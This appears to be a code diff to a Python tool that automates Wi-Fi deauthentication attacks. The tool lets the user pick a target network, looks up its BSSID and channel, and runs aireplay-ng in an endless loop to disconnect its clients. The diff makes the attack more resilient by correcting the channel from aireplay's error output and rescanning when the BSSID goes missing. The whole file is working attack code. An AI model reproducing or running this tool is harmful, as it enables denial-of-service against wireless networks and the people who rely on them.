@@ -26,7 +26,7 @@ blue = "\033[1;34m"
 
 def deleteF():
 
-    subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt ./essidColt.py", shell = True, check = True )
+    subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt ./essidColt.py ./wifiChnelSts.py", shell = True, check = True )
 
 
 
@@ -88,15 +88,17 @@ def iwCh( channel, interface ):
 
 
 
-def kiddDeAuth( BSSID, interface ):
+def kiddDeAuth( BSSID, interface, ESSID ):
 
     try:
 
         print( f"\n\n{ red }Program is roasting the fish!\n\n" )
 
+        chkErrF = open( "wifiChnelSts.py", "w" )
+
         cmd = [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ]
 
-        p = subprocess.Popen( cmd )
+        p = subprocess.Popen( cmd, stdout = chkErrF, stderr = subprocess.PIPE )
 
         time.sleep( 20 )
 
@@ -104,11 +106,51 @@ def kiddDeAuth( BSSID, interface ):
 
         p.wait()
 
+        time.sleep( 1 )
+
+        try:
+
+            radChkErrF = open( "wifiChnelSts.py", "r" )
+
+            txt = radChkErrF.read().strip()
+
+            try:
+
+                ap = re.findall( r"but the AP uses channel (\S+)", txt, re.IGNORECASE )[ 0 ]
+
+                AP = ap.strip()
+
+                if type( int( AP ) ) == int or AP:
+
+                    iwCh( AP, interface )
+
+                time.sleep( 1 )
+
+            except:
+
+                print( f"\n\n{ green }Channel is set correctly\n\n" )
+
+            try:
+
+                noBssid = re.findall( r"No such BSSID available", txt, re.IGNORECASE )[ 0 ]
+
+                if noBssid.lower() == "no such bssid available" or noBssid:
+
+                    air( interface, ESSID )
+
+            except:
+
+                print( f"\n\n{ green }BSSID is available\n\n" )
+
+        except:
+
+            print( f"\n\n{ yellow }wifiChnelSts file is missing!\n\n" )
+
         print( f"\n\n{ green }Taking a nap 💤\n\n" )
 
         time.sleep( 60 )
 
-        kiddDeAuth( BSSID, interface )
+        kiddDeAuth( BSSID, interface, ESSID )
 
     except:
 
@@ -126,7 +168,7 @@ def kiddDeAuth( BSSID, interface ):
 
 
 
-def air( IF ):
+def air( IF, rstEssid = None ):
 
     lst = []
 
@@ -148,37 +190,49 @@ def air( IF ):
 
     p.wait()
 
-    essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' wifiInterF.txt | sort -u > essidColt.py"
+    if rstEssid == None:
 
-    subprocess.run( essidCmd, shell = True, check = True )
+        essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' wifiInterF.txt | sort -u > essidColt.py"
 
-    time.sleep( 0.2 )
+        subprocess.run( essidCmd, shell = True, check = True )
 
-    with open( "essidColt.py", "r" ) as f:
+        time.sleep( 0.2 )
 
-        for readL in f:
+        with open( "essidColt.py", "r" ) as f:
 
-            mdWrd = readL.strip()
+            for readL in f:
 
-            for y in rmLst:
+                mdWrd = readL.strip()
 
-                mdWrd = mdWrd.replace( y, "" )
+                for y in rmLst:
 
-            lst.append( mdWrd.strip() )
+                    mdWrd = mdWrd.replace( y, "" )
 
-    clnData = [ re.sub( r"\x1b\[.*?K", "", x ) for x in lst ]
+                lst.append( mdWrd.strip() )
 
-    clnData1 = [ x.strip() for x in clnData if x.strip() != "" ]
+        clnData = [ re.sub( r"\x1b\[.*?K", "", x ) for x in lst ]
 
-    resultLst = list( set( clnData1 ) )
+        clnData1 = [ x.strip() for x in clnData if x.strip() != "" ]
 
-    tile = f"Choose a fish name in { len( resultLst ) }"
+        resultLst = list( set( clnData1 ) )
 
-    wihOne = [ inquirer.List( "opt", message = tile, choices = resultLst ) ]
+        tile = f"Choose a fish name in { len( resultLst ) }"
 
-    wifiName = inquirer.prompt( wihOne )[ "opt" ]
+        wihOne = [ inquirer.List( "opt", message = tile, choices = resultLst ) ]
 
-    ESSID = wifiName.lower()
+        wifiName = inquirer.prompt( wihOne )[ "opt" ]
+
+        dic[ "fishName" ] = wifiName
+
+        dic[ "ESSID" ] = wifiName.lower()
+
+    else:
+
+        dic[ "ESSID" ] = rstEssid.lower()
+
+        dic[ "fishName" ] = rstEssid
+
+    ESSID = dic[ "ESSID" ]
 
     cmd1 = "sudo grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $2 }' > wifiBssid.py" % ESSID
 
@@ -210,7 +264,9 @@ def air( IF ):
 
         else:
 
-            print( f"\n\n\n{ green }🐟 { wifiName } fish on!\n\n" )
+            bigFishName = dic[ "fishName" ]
+
+            print( f"\n\n\n{ green }🐟 { bigFishName } fish on!\n\n" )
 
             dic[ "bssid" ] = bssid
 
@@ -226,7 +282,7 @@ def air( IF ):
 
     iwCh( dic[ "channel" ], IF )
 
-    kiddDeAuth( dic[ "bssid" ], IF )
+    kiddDeAuth( dic[ "bssid" ], IF, dic[ "fishName" ] )
 
 
 
